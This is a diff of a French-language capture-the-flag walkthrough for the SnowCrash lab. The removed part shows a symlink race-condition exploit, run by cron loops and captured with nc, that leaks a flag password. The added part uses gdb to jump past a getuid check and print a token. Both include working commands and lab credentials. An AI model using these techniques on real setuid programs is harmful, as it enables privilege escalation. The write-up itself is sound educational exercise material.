@@ -6,69 +6,54 @@
 *       -> resultat
 */
 
-En executant le script level10 on remarque qu il attend un fichier et un host. Ca ressemble au niveau 8 donc utilise la methode strings et gdb pour en
-apprendre plus sur le binaire:
-    - on remarque au on utilise la fonction access donc il verifie les droits du fichiers avant de pouvoir l ouvrir
-    - aussi il utilise une connexion socket (function socket et connect) sur le port 6969
-Il va donc falloir de maniere similaire au level08 lui faire croire qu on a les droits sur le fichier token pour qu il envoie le fichier sur le socket par le port 6969.
-Ainsi on va ecrire 2 scripts:
-    - /tmp/hack:
-/*********************/
-    #!/bin/sh
-    while true; do
-    rm -rf /tmp/tok
-    ln -s ~/token /tmp/tok
-    done
-/**********************/
-Ce script créé en boucle le lien symbolique de token vers /tmp/tok. cela va permettre d exploiter le temps entre l open et l access.
+- un fichier level13 executable, on l execute:
+./level13
+    -> UID 2013 started us but we we expect 4242!
+On va donc essayer de voir comment est construit le programme avec gdb!
 
-    - /tmp/method:
-/**********************/
-    #!/bin/sh
-    while tru; do
-    ~/level10 /tmp/tok 127.0.0.1
-    done
-/**********************/
-Ce script execute le binaire level10 avec le fichier tok créé au dessus et utilise le localhost.
+- On utilise gdb pour en savoir plus:
+gdb level13 
+set disassembly-flavor intel
+break *main
+run
+    -> On ca qui s affiche:
+    (gdb) break *main
+    Breakpoint 2 at 0x804858c
+    (gdb) run
+    Breakpoint 2, 0x0804858c in main ()
+    (gdb) disassemble
+    Dump of assembler code for function main:
+    => 0x0804858c <+0>:	push   ebp
+    0x0804858d <+1>:	mov    ebp,esp
+    0x0804858f <+3>:	and    esp,0xfffffff0
+    0x08048592 <+6>:	sub    esp,0x10
+    0x08048595 <+9>:	call   0x8048380 <getuid@plt>
+    0x0804859a <+14>:	cmp    eax,0x1092               -> comparaison -> surement celle qui conditionne le main et qui utilise le resultat de getuid 
+    0x0804859f <+19>:	je     0x80485cb <main+63>      -> je signifie que si cest egale on execute la suite
+    0x080485a1 <+21>:	call   0x8048380 <getuid@plt>
+    0x080485a6 <+26>:	mov    edx,0x80486c8
+    0x080485ab <+31>:	mov    DWORD PTR [esp+0x8],0x1092
+    0x080485b3 <+39>:	mov    DWORD PTR [esp+0x4],eax
+    0x080485b7 <+43>:	mov    DWORD PTR [esp],edx
+    0x080485ba <+46>:	call   0x8048360 <printf@plt>
+    0x080485bf <+51>:	mov    DWORD PTR [esp],0x1
+    0x080485c6 <+58>:	call   0x80483a0 <exit@plt>
+    0x080485cb <+63>:	mov    DWORD PTR [esp],0x80486ef
+    0x080485d2 <+70>:	call   0x8048474 <ft_des>
+    0x080485d7 <+75>:	mov    edx,0x8048709
+    0x080485dc <+80>:	mov    DWORD PTR [esp+0x4],eax
+    0x080485e0 <+84>:	mov    DWORD PTR [esp],edx
+    0x080485e3 <+87>:	call   0x8048360 <printf@plt>
+    0x080485e8 <+92>:	leave
+    0x080485e9 <+93>:	ret
+    End of assembler dump.
 
-On ajoute ces 2 scripts pour etre executer en permanence (toutes les 2 minutes) avec la commande crontab -e:
-crontab -e:
-*/2 * * * * sh /tmp/hack
-*/2 * * * * sh /tmp/method
-
-En faisant un ps -aux, on peut voir les 2 scripts sont executes. Il nous suffit donc d'ecouter le port 6969 avec la commande nc et attendre que le flag sorte:
-nc -lk 6969 (option l et k force la commande a reste ecoute). Après quelques minutes, on a :
-.*( )*.
-.*( )*.
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-
-il suffit de se connecter:
-su flag10
-Password: woupa2yuojeeaaed06riuj63c
-**************************
-flag10@SnowCrash:~$ getflag
-Check flag.Here is your token : feulo4b72j7edeahuete3no7c ! 
-Et on obtient le token!
+- On va donc essaye de contourner la comparaison qui securise le main. On place un break sur le call juste avant et on execute jusque la avant de faire un jump vers le main:
+break *0x8048380
+Continuing.
+Breakpoint 3, 0x08048380 in getuid@plt ()
+jump *0x80485cb
+Continuing at 0x80485cb.
+your token is 2A31L79asukciNyi8uppkEuSx
+[Inferior 1 (process 21607) exited with code 050]
+Token obtenu!
